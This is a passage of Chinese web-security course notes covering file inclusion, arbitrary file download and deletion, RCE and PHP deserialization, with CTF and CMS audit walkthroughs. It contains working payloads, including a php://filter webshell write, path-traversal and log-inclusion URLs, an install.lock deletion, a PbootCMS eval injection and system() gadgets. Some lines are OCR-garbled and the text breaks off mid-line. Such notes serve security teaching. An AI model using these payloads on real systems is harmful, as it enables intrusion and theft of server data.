<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">convert.iconv.:一种过滤器，和使用iconvO☒数处理流数据有等同作用</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[a]):?&gt;)</span></span><br><span class="line"><span class="string">echo&quot;经过一次反转：&quot;$result.&quot;\n&quot;</span></span><br><span class="line"><span class="string">echo&quot;经过第二次反转：&quot;.iconv(UCS-2LE&quot;,&quot;UCS-2BE&quot;,$result):</span></span><br><span class="line"><span class="string">？&gt;</span></span><br><span class="line"><span class="string">Payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line"><span class="string">contents=?&lt;hp pvelas(P_SO【】a,)&gt;?</span></span><br></pre></td></tr></table></figure>

<h4 id="CMS源码-XHCMS-代码审计-日志-绕过"><a href="#CMS源码-XHCMS-代码审计-日志-绕过" class="headerlink" title="#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过"></a>#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</h4><p>1、搜索特定函数寻包含点<br>2、国定目录及后缀名需绕过<br>3、由CMS无上传用日志包含<br>4、利用长度绕过后缀名固定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http://172.16.11.27/xhcms/?r=../../../nginx/logs/error.log...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>

<p>-白盒发现：</p>
<p>1、可通过应用功能追踪代码定位审计</p>
<p>2、可通过脚本特定函数搜索定位审计</p>
<p>3、可通过伪协议玩法绕过相关修复等</p>
<h4 id="本课总结：-1"><a href="#本课总结：-1" class="headerlink" title="#本课总结："></a>#本课总结：</h4><p>1、有可控文件如能上传文件，配合上传后包含</p>
<p>2、无可控文件可以利用日志或Session&amp;伪协议</p>
<p>3、代码固定目录及文件后缀时需考虑版本绕过</p>
<p>4、伪协议玩法是建立在代码中只有变量存在时</p>
<h1 id="第43天：WEB攻防-通用漏洞-任意文件下载-删除重装-敏感读取-黑白审计"><a href="#第43天：WEB攻防-通用漏洞-任意文件下载-删除重装-敏感读取-黑白审计" class="headerlink" title="第43天：WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计"></a>第43天：WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计</h1><h4 id="知识点：-23"><a href="#知识点：-23" class="headerlink" title="知识点："></a>知识点：</h4><p>1、<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C&spm=1001.2101.3001.7020">文件操作</a>类安全问题<br>2、文件下载&amp;册除&amp;读取<br>3、白盒&amp;黑盒&amp;探针分析</p>
<h4 id="详细点：-8"><a href="#详细点：-8" class="headerlink" title="#详细点："></a>#详细点：</h4><p><a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&spm=1001.2101.3001.7020">文件读取</a>：基本和文件下载利用类似<br>文件下载：利用下载获取源码或数据库配置文件及系统敏感文件为后续出思路<br>文件删除：除自身安全引发的文件除外，可配合删除重装锁定文件进行重装</p>
<h4 id="演示案例：-20"><a href="#演示案例：-20" class="headerlink" title="演示案例："></a>演示案例：</h4><p><strong>审计分析-文件下载XHCMS-功能点</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/589245286">https://zhuanlan.zhihu.com/p/589245286</a></p>
<p>思路：通过访问链接找寻文件内容逐步得知下载变量在函数传递的路径–全局搜索update inset变量找寻文件上传点–访问上传点尝试构造下载内容–访问下载链接成功</p>
<p><strong>审计分析-文件读取-Metlnfo-.函数搜索</strong></p>
<p><a href="https://blog.csdn.net/ZhaoSong_/article/details/132601103">https://blog.csdn.net/ZhaoSong_/article/details/132601103</a></p>
<p><strong>审计分析-文件删除74CMS-函数搜索</strong></p>
<p><a href="https://blog.xmcve.com/2023/03/26/cms%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0,%E8%AE%B0%E5%BD%95/#title-2">https://blog.xmcve.com/2023/03/26/cms%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0,%E8%AE%B0%E5%BD%95/#title-2</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/755bc63622561d92fa1c9ad2a5c7795c--c69c--image-20240408163202959.png" alt="image-20240408163202959"></p>
<p>找到漏洞处，然后选择去删除重装文件</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/66393751a8de0328edac9bcaadad6294--9492--image-20240408163401656.png" alt="image-20240408163401656"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/52659ecc6bacdd0f317d4bee44f90b4e--5e82--image-20240408163812708.png" alt="image-20240408163812708"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里有点要注意，需要从admin目录下直接访问这里才能跳过csrf的监测</span><br></pre></td></tr></table></figure>

<p>思路：通过函数找到文件删除点，然后找到文件添加出通过删除函数传参删除install文件致使网站进行重新配置–可将网站数据库连接到本地。</p>
<p><strong>黑盒分析-下载读取-下载资源URL参数</strong></p>
<p>通过百度可知该框架下数据库连接文件的默认路径，构造连接进行下载<br><a href="http://67.202.70.133/files/readfile.php?file=%E2%80%A6/configuration.php">http://67.202.70.133/files/readfile.php?file=…/configuration.php</a></p>
<h4 id="白盒审计："><a href="#白盒审计：" class="headerlink" title="#白盒审计："></a>#白盒审计：</h4><p>1、文件下载<br>流程功能点抓包寻代码文件寻变量控制构造测试<br>Payload:softadd&#x3D;d:&#x2F;1.txt softadd2&#x3D;d:&#x2F;1.txt<br>2、文件删除：74CMS-配合删除重装<br>流程特定函数搜索寻发调用-构造Payload测试<br>Payload:&#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;…&#x2F;…&#x2F;data&#x2F;install.lock<br>3、文件读取：Metlnfo-任意读取<br>流程。特定函数援索寻融发调用-构造Payload测试<br>Payload:&#x2F;include&#x2F;thumb.php?dir&#x3D;http…\config\config_db.php</p>
<h4 id="黑盒探针"><a href="#黑盒探针" class="headerlink" title="#黑盒探针"></a>#黑盒探针</h4><p>1、URL参数名及参数值分析：<br>参数名：英文对应翻译<br>参数值：目录或文件名<br>2、功能点自行修改后分析：<br>文件下载，册除，读取等</p>
<h1 id="第44天：WEB攻防-通用漏洞-RCE-代码执行-命令执行-多层面检测利用"><a href="#第44天：WEB攻防-通用漏洞-RCE-代码执行-命令执行-多层面检测利用" class="headerlink" title="第44天：WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用"></a>第44天：WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用</h1><h4 id="知识点：-24"><a href="#知识点：-24" class="headerlink" title="知识点："></a>知识点：</h4><p>1、RCE执行-代码执行&amp;命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);   <span class="comment">//代码执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ver&#x27;</span>);     <span class="comment">//命令执行    这两种要区分</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>命令执行指的是攻击者通过在 Web应用程序中注入恶意命令，从而执行非法操作。攻击者通常会利用可编辑的参数或表单字段，在注入时输入一些包含系统命令的字符，使得 Web 程序把这些字符作为命令执行。成功的攻击可以导致 Web 服务器受到控制，甚至可以窃取敏感信息或破坏系统。<br>代码执行指的是攻击者通过在 Web应用程序中注入恶意代码，从而让其在服务器端执行。攻击者通常会利用可编辑的参数或表单字段，在注入时输入一些包含恶意脚本的字符，使得 Web程序在解析时把这些字符直接当做代码执行。成功的攻击可以导致 Web 服务器受到控制，甚至可以窃取敏感信息或破坏系统。</p>
</blockquote>
<p>2、CTF考点-漏洞配合&amp;绕过手法<br>3、利用审计-CMS框架&amp;中间件等</p>
<h4 id="详细点：-9"><a href="#详细点：-9" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1.为什么会产生此类安全问题<br>2此类安全问题探针利用及危害<br>3.此类安全问题在CTF即CMS分析<br>漏洞场景：代码会调用自身的脚本代码执行，也会调用系统命令执行<br>漏洞区别：脚本语言&amp;操作系统(php&#x2F;java&#x2F;python&#x2F;js&amp;windows&#x2F;&#x2F;linux&#x2F;mac)<br>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）<br>漏洞危害：直接权限丢失，可执行任意却本代码或系统命令</p>
<h4 id="演示案例：-21"><a href="#演示案例：-21" class="headerlink" title="演示案例："></a>演示案例：</h4><p>RCE-原理&amp;探针&amp;利用&amp;危害等<br>CTF-29-39-RCE代码命令执行<br>CMS-PbootCMS审计-RCE执行<br>层面-探针-语言&amp;CMS&amp;中间件等</p>
<h4 id="RCE-原理-探针-利用-危害等"><a href="#RCE-原理-探针-利用-危害等" class="headerlink" title="#RCE-原理&amp;探针&amp;利用&amp;危害等"></a>#RCE-原理&amp;探针&amp;利用&amp;危害等</h4><p>举例：</p>
<?php eval代码执行 eval(phpinfo（） //system命令执行 system(ipconfig'); ?>
<p>-RCE代码执行：引用脚本代码解析执行<br>RCE命令执行：脚本调用操作系统命令<br>漏洞函数：</p>
<blockquote>
<p>1.PHP: eval（）.assert()、preg_replace()、call_user_func（)、all_user_func_array()以及aray_map()等<br>system、shell_exec、popen、passthru、proc_open等<br>2.Python eval exec subprocess os.system commands<br>3.Java: Java中没有类似php中eval函数这种亘接可以将字符玉转化为代码执行的函数， 但是有反射机制，并且有各种基于反射机制的表达式擎，如：OGNL、SpEL、MVEL等</p>
</blockquote>
<p><strong>CTF-29-39-RCE代码命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">29关</span><br><span class="line">思路：看代码过滤了flag大小写格式，使用通配符绕过 ?c=system(‘tac fla*.php’);</span><br><span class="line"></span><br><span class="line">30关</span><br><span class="line">思路：看代码除了过滤flag还过滤了system、php的大小写，使用shell_exec绕过 /?c=echo shell_exec(‘tac fla*’);</span><br><span class="line"></span><br><span class="line">‘cp fla*.ph* 2.txt’:</span><br><span class="line">echo shell exec(‘tac fla*.ph*’);</span><br></pre></td></tr></table></figure>

<p>31-参数逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval($GET[1]):&amp;1=system(‘tac flag.php’);</span><br><span class="line">思路：再上一关的基础上增加过滤shell_exec cat sort等函数，这时候可以用参数逃逸，创建新参数然后让新参数执行命令</span><br></pre></td></tr></table></figure>

<p>32~36-配合包含&amp;伪协议</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span><span class="variable">$_</span> GET[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br><span class="line"><span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">思路：过滤了；分号致使语句不能结束执行，使用<span class="keyword">include</span> <span class="meta">?&gt;</span>结束语句然后利用文件包含中的伪协议进行读取</span><br></pre></td></tr></table></figure>

<p>37~39-包含&amp;伪协议&amp;通配符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac fla);?&gt;</span></span><br><span class="line">php:<span class="comment">//input post&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>思路：直接利用文件包含，同时使用通配符绕过php flag过滤</p>
<h4 id="代码审计-PbootCMS-RCE代码执行"><a href="#代码审计-PbootCMS-RCE代码执行" class="headerlink" title="#代码审计-PbootCMS-RCE代码执行"></a>#代码审计-PbootCMS-RCE代码执行</h4><p>流程：搜索特定函数-&gt;parserlfLabe-&gt;parserCommom-&gt;About&amp;Content-&gt;构造<br>AboutController:(pboot:if(eval($_POST[1])))&#x2F;pbootif)<br>ContentController:&#x2F;index.php&#x2F;Content&#x2F;2?keyword&#x3D;(pboot:if(eval(S_REQUEST[1]))😕&#x2F;)))))<br>(&#x2F;pbootin&amp;1&#x3D;phpinto（）;</p>
<h4 id="层面-探针-语言-CMS框架-中间件"><a href="#层面-探针-语言-CMS框架-中间件" class="headerlink" title="#层面-探针-语言&amp;CMS框架&amp;中间件"></a>#层面-探针-语言&amp;CMS框架&amp;中间件</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/</a> Shiro weblogic<br>使用工具快速拿下权限</p>
<h1 id="第45天：WEB攻防-通用漏洞-PHP反序列化-POP链构造-魔术方法-原生类"><a href="#第45天：WEB攻防-通用漏洞-PHP反序列化-POP链构造-魔术方法-原生类" class="headerlink" title="第45天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类"></a>第45天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</h1><h4 id="知识点：-25"><a href="#知识点：-25" class="headerlink" title="知识点："></a>知识点：</h4><p>1、什么是反序列化操作？格式转换<br>2、为什么会出现安全漏洞？魔术方法<br>3、反序列化漏洞如何发现？对象逻辑<br>4、反序列化漏洞如何利用？-POP链构造<br>补充：反序列化利用大概分类三类<br>魔术方法的调用逻辑如触发条件<br>语言原生类的调用逻辑如SoapClient<br>-语言自身的安全缺陷如CVE-2016-7124</p>
<h4 id="反序列化课程点："><a href="#反序列化课程点：" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h4><p>-PHP&amp;Java&amp;Python</p>
<blockquote>
<p>这边注意的是，反序列化漏洞在CTF中经常会考到，而且实战面试也是一大考点</p>
</blockquote>
<p>序列化：对象转换为数组或字符串等格式<br>反序列化：将数组或字符串等格式转换成对象<br>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串<br>unserialize()&#x2F;&#x2F;将字符串还原成一个对象</p>
<h4 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="#PHP反序列化漏洞"></a>#PHP反序列化漏洞</h4><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而<br>导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些<br>魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p>
<h4 id="魔术方法利用点分析："><a href="#魔术方法利用点分析：" class="headerlink" title="#魔术方法利用点分析："></a>#魔术方法利用点分析：</h4><p>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p>
<p>魔术方法是PHP反序列化中寻找漏洞的重点之一</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():<span class="comment">//构造函数，当对象new的时候会自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():<span class="comment">//析构函数当对象被销毁时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="comment">//unserialize()时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>(): <span class="comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(): <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatci</span>(): <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>(): <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>(): <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>(): <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>(): <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>(): <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>(): <span class="comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span></span><br></pre></td></tr></table></figure>

<p><strong>演示序列化和反序列操作，将对象转化成数组或字符串</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//序列化&amp;反序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demotest</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;xiaodi&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;29&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$example</span>=<span class="keyword">new</span> <span class="title function_ invoke__">demotest</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$example</span>);<span class="comment">//序列化</span></span><br><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);<span class="comment">//反序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//O:8:&quot;demotest&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;29&quot;;&#125;</span></span><br><span class="line"><span class="comment">//object(demotest)#2 (3) &#123; [&quot;name&quot;]=&gt; string(6) &quot;xiaodi&quot; [&quot;sex&quot;]=&gt; string(3) &quot;man&quot; [&quot;age&quot;]=&gt; string(2) &quot;29&quot; &#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>演示创建对象即可触发__construct魔术方法，销毁对象触发__destruct，把类当作字符串使用时触发__toString()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//安全问题</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;echo test&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;x&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__construct&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;__toString&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无需函数，创建对象触发魔术方法</span></span><br><span class="line"><span class="comment">//$a=new A();//触发__construct</span></span><br><span class="line"><span class="comment">//$a-&gt;test();//触发test</span></span><br><span class="line"><span class="comment">//echo $a;//触发__toString</span></span><br><span class="line"><span class="comment">//触发__destruct</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;echo test&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure>

<p><strong>此处创建新对象会自动先输出xiaodisec然后执行ipconfig，此处传参将参数反序列化时会自动触发__destruct()执行ipconfig命令</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//漏洞出现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数引用，无对象创建触发魔术方法</span></span><br><span class="line"><span class="comment">//?x=O:1:&quot;B&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;ver&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[x]);</span><br><span class="line"><span class="comment">//$b=new b();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">此处算是正式利用反序列化触发<span class="title function_ invoke__">__destruct</span>(),执行系统命令ipconfig，在函数引用时，使用了反序列化漏洞的方式来构造了一个恶意对象，</span><br><span class="line">由于在反序列化过程中会触发 <span class="title function_ invoke__">__destruct</span>() 方法的执行，因此可以通过构造恶意对象来执行任意系统命令，导致严重的安全问题。</span><br><span class="line">具体来说，当我们通过访问链接 ?c=O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ver&quot;</span>;&#125; 来触发反序列化操作时，</span><br><span class="line">会将该字符串反序列化为一个对象，并调用其中的 <span class="title function_ invoke__">__destruct</span>() 方法。</span><br><span class="line">由于 <span class="variable">$cmd</span> 成员变量的值被设置为字符串 <span class="string">&quot;ipconfig&quot;</span>，因此在调用 <span class="title function_ invoke__">__destruct</span>() 方法时，会执行系统命令 <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd)，</span><br><span class="line">从而执行 ipconfig 命令并输出相关信息。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;ipconfig&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数引用，无对象创建触发魔术方法自定义变量</span></span><br><span class="line"><span class="comment">//?c=O:1:&quot;C&quot;:1:&#123;s:3:&quot;cmd&quot;;s:3:&quot;ver&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[c]);</span><br></pre></td></tr></table></figure>

<h4 id="演示案例：-22"><a href="#演示案例：-22" class="headerlink" title="演示案例："></a>演示案例：</h4><p>反序列化魔术方法&amp;漏洞引发&amp;变量修改等<br>CTFSHOW-关卡254到260-原生类&amp;POP构造<br>CMS代码审计-Typecho)反序列化&amp;魔术方法逻辑</p>
<h4 id="CTFSHOW-关卡254-260原生类-POP构造"><a href="#CTFSHOW-关卡254-260原生类-POP构造" class="headerlink" title="#CTFSHOW-关卡254-260原生类&amp;POP构造"></a>#CTFSHOW-关卡254-260原生类&amp;POP构造</h4><h6 id="254对象引用执行逻辑"><a href="#254对象引用执行逻辑" class="headerlink" title="254对象引用执行逻辑"></a>254对象引用执行逻辑</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=xxxxx&amp;password=xxxxxx</span><br><span class="line">思路：从代码分析若想输出flag则需要isvip为真，而isvip为真需要调用方法login满足接收的参数usernam和password=xxxxx，则只需要通过get方式传入正确参数即可</span><br></pre></td></tr></table></figure>

<h6 id="255反序列化变量修改1"><a href="#255反序列化变量修改1" class="headerlink" title="255反序列化变量修改1"></a>255反序列化变量修改1</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Code</span><br><span class="line">publc ￥svip=<span class="literal">true</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctishowUserl</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">senalize</span>(<span class="variable">$a</span>));</span><br><span class="line">Get userame=xxxxoxxpassword=xxxxx</span><br><span class="line">Cookie:user=O3A113A%<span class="number">22</span>ctfShowUser223A363A7Bs%<span class="number">3</span>A8%<span class="number">3</span>A22usema</span><br><span class="line">me223BsG0A693A122xxxxx1223Bs3AB1 <span class="number">3</span>A122password%<span class="number">22</span>%<span class="number">3</span>Bs9 <span class="number">3</span>A6</span><br><span class="line"><span class="number">9</span>%<span class="number">3</span>A02200000.<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5,<span class="number">3</span>A622isVp%,<span class="number">22</span>%<span class="number">3</span>BD%<span class="number">3</span>A1%<span class="number">3</span>日%，<span class="number">7</span>D</span><br><span class="line">思路：同上关，需要将isvip确定为ture，但是代码中并无修改isvip的方法，此时需要通过构造pop链将isvip确定为ture，构造pop链的方法是创建一个新对象，并将对象通过序列化的方法输出出来（此时还需要将序列化后的对象进行url编码防止乱码的现象发生），然后将序列化编码后的对象通过修改数据包传参到cookie字段中的user变量，然后代码会通过反序列化的方式将isvip修改为ture，修改数据包时还需要通过get方式传参username和password进行登录验证（因为只有登录成功以后函数才会使得<span class="keyword">if</span>（<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>)）为真）。</span><br></pre></td></tr></table></figure>

<h6 id="256-反序列化参数修改2"><a href="#256-反序列化参数修改2" class="headerlink" title="256-反序列化参数修改2"></a>256-反序列化参数修改2</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Code</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">Sa=<span class="keyword">new</span> ctfShowUser（）.</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(Sa));</span><br><span class="line">GET.userame=x&amp;password=y</span><br><span class="line">COOKIE:user=<span class="number">0</span>%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>usern</span><br><span class="line">ame%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span> passw0rd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A</span><br><span class="line">%<span class="number">22</span>y%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVp%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line">思路：分析代码，同上关需要满足username不等于password,同时username和password都等于xxxxxx，</span><br><span class="line">并且isvip为ture的情况下才会输出flag。则需要构造pop链，</span><br><span class="line">构造<span 